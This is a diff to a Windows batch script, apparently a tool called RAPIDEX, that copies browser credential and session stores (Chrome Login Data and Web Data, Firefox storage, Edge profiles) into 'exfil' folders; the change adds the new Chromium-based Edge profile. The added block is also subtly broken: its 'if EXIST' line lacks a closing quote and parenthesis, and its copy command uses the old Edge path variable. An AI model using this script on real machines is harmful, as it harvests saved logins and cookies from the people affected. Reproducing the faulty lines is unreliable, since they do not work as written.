@@ -60,6 +60,7 @@ rem Location of browser data
 set RAPIDEX_CHROME=%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default
 set RAPIDEX_FIREFOX=%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles
 set RAPIDEX_EDGE="%USERPROFILE%\AppData\Local\Packages\Microsoft.MicrosoftEdge_8wekyb3d8bbwe"
+set RAPIDEX_EDGE_79="%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default"
 
 @echo Creating directories for exfil in %EXFIL_HOST%
 mkdir "%EXFIL_HOST%"                      2> NUL
@@ -75,6 +76,7 @@ mkdir "%EXFIL_BROWSER%\chrome\Login Data" 2> NUL
 mkdir "%EXFIL_BROWSER%\chrome\Web Data"   2> NUL
 mkdir "%EXFIL_BROWSER%\firefox"           2> NUL
 mkdir "%EXFIL_BROWSER%\edge"              2> NUL
+mkdir "%EXFIL_BROWSER%\edge79"            2> NUL
 mkdir "%EXFIL_BROWSER%\ie\cookies"        2> NUL
 mkdir "%EXFIL_BROWSER%\ie\favorites"      2> NUL
 
@@ -162,10 +164,14 @@ if EXIST "%RAPIDEX_FIREFOX%" (
     for /D %%I in (%RAPIDEX_FIREFOX%\*) do xcopy /C /Q /G /H /R /K /Y "%RAPIDEX_FIREFOX%\%%~nI%%~xI\webappsstore.sqlite-wal" "%EXFIL_BROWSER%\firefox\%%~nI%%~xI\" 2> NUL
 )
 
-rem Modern Edge and IE hide cookies somewhere else, but we'll try anyway...
-if EXIST "%RAPIDEX_EDGE%" (
-    @echo Grab Edge [Dumb]
-    xcopy /E /C /G /H /Y /Q "%RAPIDEX_EDGE%" "%EXFIL_BROWSER%\edge"
+REM if EXIST "%RAPIDEX_EDGE%" (
+REM     @echo Grab Edge Old [Dumb]
+REM     xcopy /E /C /G /H /Y /Q "%RAPIDEX_EDGE%" "%EXFIL_BROWSER%\edge"
+REM )
+
+if EXIST "%RAPIDEX_EDGE_79%
+    @echo Grab Edge New [Dumb]
+    xcopy /E /C /G /H /Y /Q "%RAPIDEX_EDGE%" "%EXFIL_BROWSER%\edge79"
 )
 
 @echo Grab IE [Dumb]
@@ -184,4 +190,3 @@ rem Change window title to path to cmd.exe (default)
 title %comspec%
 color
 ENDLOCAL
-goto :EOF
